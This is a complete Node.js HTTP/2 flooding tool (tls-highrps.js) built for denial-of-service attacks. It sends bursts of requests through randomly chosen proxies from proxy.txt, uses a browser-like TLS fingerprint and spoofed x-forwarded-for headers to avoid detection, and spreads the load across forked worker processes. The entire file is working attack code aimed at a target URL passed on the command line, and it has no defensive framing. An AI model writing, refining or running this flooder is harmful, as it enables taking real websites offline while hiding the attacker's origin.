const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5) {
    console.log(`Usage: node tls-highrps.js URL TIME REQ_PER_SEC THREADS`);
    console.log(`Example: node tls-highrps.js https://target.com 60 100 5`);
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureProtocol = "TLS_client_method";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
});

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5]
};

const parsedTarget = url.parse(args.target);
const proxies = fs.readFileSync("proxy.txt", "utf-8").toString().split(/\r?\n/);
const userAgents = fs.readFileSync("ua.txt", "utf-8").toString().split(/\r?\n/);

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 0);
}

class NetSocket {
    HTTP(options, callback) {
        const addr = options.address + ":443";
        const buffer = Buffer.from(`CONNECT ${addr} HTTP/1.1\r\nHost: ${addr}\r\nConnection: Keep-Alive\r\n\r\n`);
        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            if (chunk.toString().includes("200")) {
                return callback(connection, undefined);
            } else {
                connection.destroy();
                return callback(undefined, "proxy fail");
            }
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "timeout");
        });

        connection.on("error", () => {
            connection.destroy();
            return callback(undefined, "error");
        });
    }
}

const Socker = new NetSocket();

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host,
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        const tlsOptions = {
            port: 443,
            secure: true,
            ALPNProtocols: ["h2"],
            ciphers: ciphers,
            sigalgs: sigalgs,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                enablePush: false,
                initialWindowSize: 1073741823
            },
            createConnection: () => tlsConn
        });

        let activeStreams = 0;
        const MAX_STREAMS = 100;

        client.on("connect", () => {
            const attack = setInterval(() => {
                if (activeStreams >= MAX_STREAMS) return;

                for (let i = 0; i < args.rate; i++) {
                    const headers = {
                        ":method": "GET",
                        ":path": parsedTarget.path,
                        ":scheme": "https",
                        ":authority": parsedTarget.host,
                        "user-agent": randomElement(userAgents),
                        "x-forwarded-for": parsedProxy[0],
                        "accept": "*/*",
                        "accept-language": "en-US,en;q=0.9",
                        "accept-encoding": "gzip, deflate, br",
                        "cache-control": "no-cache",
                        "referer": "https://" + parsedTarget.host + parsedTarget.path,
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "none"
                    };

                    try {
                        const req = client.request(headers);
                        req.end();
                        activeStreams++;

                        req.on("close", () => activeStreams--);
                        req.on("error", () => activeStreams--);
                    } catch (e) {
                        // Ignore errors to continue firing
                    }
                }
            }, 50); // Attack frequency
        });

        client.on("error", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });
    });
}

setTimeout(() => process.exit(0), args.time * 1000);

process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});
